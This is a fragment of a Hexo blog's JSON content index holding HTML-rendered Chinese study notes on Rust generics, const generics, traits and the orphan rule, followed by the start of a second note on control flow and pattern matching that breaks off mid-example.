<span class=\"token punctuation\">{</span>\n        <span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span> <span class=\"token punctuation\">{</span> x<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p.x = {}\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>这个例子中，<code>T,U</code> 是定义在结构体 <code>Point</code> 上的泛型参数，<code>V,W</code> 是单独定义在方法 <code>mixup</code> 上的泛型参数，它们并不冲突，说白了，你可以理解为，一个是结构体泛型，一个是函数泛型。</p>\n</blockquote>\n<h3 id=\"为具体的泛型类型实现方法\"><a href=\"#为具体的泛型类型实现方法\" class=\"headerlink\" title=\"为具体的泛型类型实现方法\"></a>为具体的泛型类型实现方法</h3><blockquote>\n<p>对于 <code>Point&lt;T&gt;</code> 类型，你不仅能定义基于 <code>T</code> 的方法，还能针对特定的具体类型，进行方法定义：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">f32</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">distance_from_origin</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f32</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这段代码意味着 <code>Point&lt;f32&gt;</code> 类型会有一个方法 <code>distance_from_origin</code>，而其他 <code>T</code> 不是 <code>f32</code> 类型的 <code>Point&lt;T&gt; </code>实例则没有定义此方法。这个方法计算点实例与坐标<code>(0.0, 0.0)</code> 之间的距离，并使用了只能用于浮点型的数学运算符。</p>\n<p>这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。</p>\n</blockquote>\n<h3 id=\"const-泛型\"><a href=\"#const-泛型\" class=\"headerlink\" title=\"const 泛型\"></a>const 泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?}\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先看看这段代码，如果我们想要约束传入切片的大小该怎么做呢</p>\n<p>const泛型其实就是针对常量值的泛型</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">usize</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">;</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{:?}\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们声明了一个常量泛型usize，这个usize可以放到入参处切片的类型中去，这便是常量泛型的用法。</p>\n<h3 id=\"泛型的性能\"><a href=\"#泛型的性能\" class=\"headerlink\" title=\"泛型的性能\"></a>泛型的性能</h3><blockquote>\n<p>在 Rust 中泛型是零成本的抽象，意味着你在使用泛型时，完全不用担心性能上的问题。</p>\n<p>但是任何选择都是权衡得失的，既然我们获得了性能上的巨大优势，那么又失去了什么呢？Rust 是在编译期为泛型对应的多个类型，生成各自的代码，因此损失了编译速度和增大了最终生成文件的大小。</p>\n<p>具体来说：</p>\n<p>Rust 通过在编译时进行泛型代码的 <strong>单态化</strong>(<em>monomorphization</em>)来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用代码转换为特定代码的过程。</p>\n<p>编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。</p>\n</blockquote>\n<h2 id=\"特征-trait\"><a href=\"#特征-trait\" class=\"headerlink\" title=\"特征(trait)\"></a>特征(trait)</h2><p>其实对应的就是java的interface，不过似乎设计得更好</p>\n<h3 id=\"定义特征\"><a href=\"#定义特征\" class=\"headerlink\" title=\"定义特征\"></a>定义特征</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// 允许有默认实现</span>\n    <span class=\"token comment\">// 默认实现中允许调用其他方法</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize1</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"巴拉巴拉\"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"为类型实现特征\"><a href=\"#为类型实现特征\" class=\"headerlink\" title=\"为类型实现特征\"></a>为类型实现特征</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Post</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">pub</span> title<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 标题</span>\n    <span class=\"token keyword\">pub</span> author<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 作者</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 内容</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Post</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"文章{}, 作者是{}\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>author<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Weibo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">pub</span> username<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Weibo</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}发表了微博{}\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样的设计让Rust实现Kotlin那样的拓展函数成为可能。</p>\n<h3 id=\"孤儿原则\"><a href=\"#孤儿原则\" class=\"headerlink\" title=\"孤儿原则\"></a>孤儿原则</h3><blockquote>\n<p>上面我们将 <code>Summary</code> 定义成了 <code>pub</code> 公开的。这样，如果他人想要使用我们的 <code>Summary</code> 特征，则可以引入到他们的包中，然后再进行实现。</p>\n<p>关于特征实现与定义的位置，有一条非常重要的原则：<strong>如果你想要为类型 <code>A</code> 实现特征 <code>T</code>，那么 <code>A</code> 或者 <code>T</code> 至少有一个是在当前作用域中定义的！</strong>。例如我们可以为上面的 <code>Post</code> 类型实现标准库中的 <code>Display</code> 特征，这是因为 <code>Post</code> 类型定义在当前的作用域中。同时，我们也可以在当前包中为 <code>String</code> 类型实现 <code>Summary</code> 特征，因为 <code>Summary</code> 定义在当前作用域中。</p>\n<p>但是你无法在当前作用域中，为 <code>String</code> 类型实现 <code>Display</code> 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。</p>\n<p>该规则被称为<strong>孤儿规则</strong>，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码。</p>\n</blockquote>\n<h3 id=\"形参约束\"><a href=\"#形参约束\" class=\"headerlink\" title=\"形参约束\"></a>形参约束</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! {}\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 多重约束</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Display</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 不使用where约束</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 使用where约束</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">some_function</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">U</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">U</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">i32</span>\n    <span class=\"token keyword\">where</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Display</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Clone</span><span class=\"token punctuation\">,</span>\n          <span class=\"token class-name\">U</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Clone</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">Debug</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>虽然 <code>impl Trait</code> 这种语法非常好理解，但是实际上它只是一个语法糖：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">notify</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Summary</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Breaking news! {}\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>// TODO</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Rust笔记其二\"><a href=\"#Rust笔记其二\" class=\"headerlink\" title=\"Rust笔记其二\"></a>Rust笔记其二</h1><h2 id=\"流程控制\"><a href=\"#流程控制\" class=\"headerlink\" title=\"流程控制\"></a>流程控制</h2><p>比较类似go吧，if for这些后面跟的表达式都不用用括号包起来</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 这里比较像kotlin，没有采用传统的三元运算符</span>\n<span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> number <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> condition <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">5</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">6</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 多分支</span>\n<span class=\"token keyword\">let</span> n <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is not divisible by 4, 3, or 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// for循环</span>\n<span class=\"token comment\">// 有点类似kt, 支持区间</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 遍历集合</span>\n<span class=\"token comment\">// 注意所有权的转移，不取引用的话下面就用不了container了</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span>container <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 遍历时修改</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> collection <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 遍历index和值</span>\n<span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// `.iter()` 方法把 `a` 数组变成一个迭代器</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第&#123;&#125;个元素是&#123;&#125;\"</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 无限循环 等价于while(true)</span>\n<span class=\"token keyword\">loop</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"again!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>值得注意的是，rust的break既可以单独使用，也可以让他返回一个值</p>\n<p>loop是一个表达式，因而可以返回一个值</p>\n</blockquote>\n<h2 id=\"模式匹配\"><a href=\"#模式匹配\" class=\"headerlink\" title=\"模式匹配\"></a>模式匹配</h2><blockquote>\n<p>画重点，rust的模式匹配非常强大，以至于其他语言都在抄</p>\n</blockquote>\n<h3 id=\"match\"><a href=\"#match\" class=\"headerlink\" title=\"match\"></a>match</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 这里是比较类似于其他语言switch的用法</span>\n<span class=\"token comment\">// 但match比switch强大得多</span>\n<span class=\"token keyword\">enum</span> 